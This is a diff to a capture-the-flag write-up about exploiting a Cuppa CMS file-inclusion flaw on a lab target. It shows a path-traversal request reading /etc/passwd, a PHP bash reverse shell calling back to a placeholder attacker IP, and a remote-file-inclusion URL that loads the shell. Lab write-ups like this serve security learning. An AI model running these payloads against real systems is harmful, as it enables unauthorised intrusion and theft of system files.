@@ -308,22 +308,26 @@ http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.b
 -----------------------------------------------------------------------------
 ...
 ```
-The path listed target/cuppa/alerts/... I checked gobuster or dictionary and then added cuppa. There is no cuppa name in the directory structure but alerts is present. so I tried:
+The path listed target/cuppa/alerts/... I checked gobuster or dictionary and then added cuppa. There is no cuppa name in the directory structure but alerts is present in administrator directory. so I tried:
+```
 http://THM_Target/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
-
+```
 This successfully downloads the full passwd file, changing passwd to shadows blank page indicating not at root user access privilege.
 
 For remote file inclusion we can upload a reverse shell, using a PHP file. for a PHP file to be executable and to run a bash script inside:
+```
 <?php
 exec("/bin/bash -c 'command1; command2; command3'");
 ?>
+```
 using a simple reverse shell:
 ```
 <?php exec ("/bin/bash -c 'bash -i >& /dev/tcp/<AttackBoxIP>/443 0>&1'");?>
 ```
 Then uploading using a simple python http server and calling the script by changing urlconfig line:
+```
 urlConfig=http://<AttackBoxIP>443/shell.php
-
+```
 A reverse shell is connected and flag is obtained:
 
 ```
